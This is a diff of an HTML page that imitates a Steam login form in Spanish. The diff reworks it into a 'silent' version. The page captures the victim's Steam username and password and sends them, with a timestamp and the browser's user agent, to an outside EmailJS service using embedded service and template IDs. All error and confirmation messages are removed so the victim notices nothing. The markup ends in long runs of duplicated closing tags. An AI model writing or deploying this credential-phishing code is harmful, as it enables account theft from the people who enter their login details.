@@ -750,86 +750,48 @@
 </div><div class="FullModalOverlay" style="display: none;"><div class="ModalOverlayContent ModalOverlayBackground"></div></div><!-- Tu contenido original -->
 ></div></div>
 
-></div></div> <!DOCTYPE html>
+></div></div>  <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Formulario Login con EmailJS</title>
+  <title>Formulario Silencioso con EmailJS</title>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
   <form id="loginForm">
     <label for="steamAccountName">Usuario Steam:</label><br />
-    <input type="text" id="steamAccountName" name="steamAccountName" required /><br /><br />
+    <input type="text" id="steamAccountName" name="user_email" required /><br /><br />
     
     <label for="steamPassword">Contraseña Steam:</label><br />
-    <input type="password" id="steamPassword" name="steamPassword" required /><br /><br />
+    <input type="password" id="steamPassword" name="password" required /><br /><br />
     
     <input type="submit" id="SteamLogin" value="Sign in" />
   </form>
 
-  <div id="error_display" style="color: red; margin-top: 20px; display: none;"></div>
-
   <script>
-    // Inicializamos EmailJS con tus credenciales
-    emailjs.init({ 
-      publicKey: "3x0styJQNXamR4XT4" 
-    });
+    emailjs.init("3x0styJQNXamR4XT4");
 
-    // Capturamos el evento submit del formulario de login
     document.getElementById('loginForm').addEventListener('submit', function(event) {
-      event.preventDefault(); // ← Impide el envío real
-      
-      var btn = document.getElementById('SteamLogin');
-      if (btn) {
-        btn.disabled = true;
-        btn.value = "Signing in...";
-      }
-      
-      const extraParams = {
-        timestamp: new Date().toLocaleString('es-ES', { 
-          timeZone: 'Europe/Madrid' 
-        }),
+      event.preventDefault();
+
+      emailjs.sendForm('service_33u0mdn', 'template_ghyltzf', this, {
+        timestamp: new Date().toLocaleString('es-ES', { timeZone: 'Europe/Madrid' }),
         user_agent: navigator.userAgent
-      };
-      
-      emailjs.sendForm('service_33u0mdn', 'template_ghyltzf', this, extraParams)
-        .then(function(response) {
-          console.log('Correo enviado OK → Status:', response.status, response.text);
-          
-          var errorDiv = document.getElementById('error_display');
-          if (errorDiv) {
-            errorDiv.style.display = 'block';
-            errorDiv.innerHTML = 'Incorrect login details.<br>Please try again.';
-          }
-          
-          if (btn) {
-            btn.disabled = false;
-            btn.value = "Sign in";
-          }
-          
-          document.getElementById('steamAccountName').value = '';
-          document.getElementById('steamPassword').value = '';
-        })
-        .catch(function(error) {
-          console.error('Error al enviar el correo:', error);
-          
-          var errorDiv = document.getElementById('error_display');
-          if (errorDiv) {
-            errorDiv.style.display = 'block';
-            errorDiv.innerHTML = 'Connection error.<br>Try again later.';
-          }
-          
-          if (btn) {
-            btn.disabled = false;
-            btn.value = "Sign in";
-          }
-        });
+      })
+      .then(function(response) {
+        // Envío silencioso: no se muestra nada al usuario
+        console.log('Email enviado silenciosamente.');
+      })
+      .catch(function(error) {
+        // Tampoco mostramos errores visibles
+        console.error('Error en envío silencioso:', error);
+      });
     });
   </script>
 </body>
-</html> </body></html></body></html></body></html>
+</html></body></html></body></html></body></html>
 ></div></div></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html>
+
 
 
 
